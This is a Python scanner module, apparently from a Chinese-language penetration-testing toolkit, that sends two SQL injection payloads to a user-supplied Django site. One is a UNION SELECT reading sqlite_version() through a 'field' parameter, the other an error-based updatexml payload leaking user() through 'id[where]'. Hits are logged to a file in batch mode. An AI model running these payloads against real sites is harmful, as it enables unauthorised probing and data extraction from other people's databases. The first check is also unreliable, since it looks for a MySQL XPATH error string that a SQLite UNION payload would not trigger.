#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class DjangoSqlScan:

    def run(self, urls):
        try:
            url = urls + '/demo?field=demo.name" FROM "demo_user" union SELECT "1",sqlite_version(),"3" --'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            if "XPATH" in response.text:
                OutPrintInfoSuc("Django", f"存在SQL注入 {url}")
                if self.batch:
                    OutPutFile("django_sql.txt",f"存在SQL注入 {url}")

            else:
                if not self.batch:
                    OutPrintInfo("Django", '不存在存在SQL注入')
                
        except Exception:
            if not self.batch:
                OutPrintInfo("Django", '目标请求出错')

    def run2(self,urls):
        try:
            url = urls + '/?id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1) #'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            if "XPATH" in response.text:
                OutPrintInfoSuc("DJango", f"存在SQL注入 {url}")
                if self.batch:
                    OutPutFile("django_sql.txt", f"存在SQL注入 {url}")
            else:
                if not self.batch:
                    OutPrintInfo("Django", '不存在存在SQL注入')

        except Exception:
            if not self.batch:
                OutPrintInfo("Django", '目标请求出错')
    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Django", '开始检测SQL注入...')
        self.run(url)
        self.run2(url)
        if not self.batch:
            OutPrintInfo("Django", 'SQL注入检测结束')